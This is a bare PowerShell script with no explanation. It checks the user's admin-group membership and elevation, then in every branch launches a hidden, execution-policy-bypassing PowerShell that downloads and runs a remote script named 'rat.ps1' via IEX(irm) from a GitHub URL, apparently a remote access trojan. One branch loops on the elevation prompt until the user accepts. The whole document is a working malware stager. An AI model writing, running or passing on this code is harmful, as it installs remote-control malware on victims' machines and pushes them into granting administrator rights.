$username = $env:USERNAME
$computer = $env:COMPUTERNAME

$adminGroup = Get-LocalGroupMember -Group "Administrators" -ErrorAction SilentlyContinue | Where-Object {
    $_.Name -like "$computer\$username" -or $_.Name -like "$username"
}


$isElevated = ([Security.Principal.WindowsIdentity]::GetCurrent()).Owner -eq ([Security.Principal.WindowsIdentity]::GetCurrent()).User


if ($adminGroup) {
    if ($isElevated) {
        
while ($true) {
    try {
        #$command = "IEX(irm 'https://lc.cx/Map88u')"
        $command = "IEX(irm 'https://github.com/devilJM/doc/raw/refs/heads/main/rat.ps1')"
        Start-Process -Verb RunAs -FilePath "powershell.exe" -ArgumentList "-nop -w h -ep bypass -C $command"
        exit
    } catch {
    }
}

    } else {
        $command = "IEX(irm 'https://github.com/devilJM/doc/raw/refs/heads/main/rat.ps1')"
        Start-Process -Verb RunAs -FilePath "powershell.exe" -ArgumentList "-nop -w h -ep bypass -C $command"
    }
} else {
            $command = "IEX(irm 'https://github.com/devilJM/doc/raw/refs/heads/main/rat.ps1')"
        Start-Process -Verb RunAs -FilePath "powershell.exe" -ArgumentList "-nop -w h -ep bypass -C $command"
}
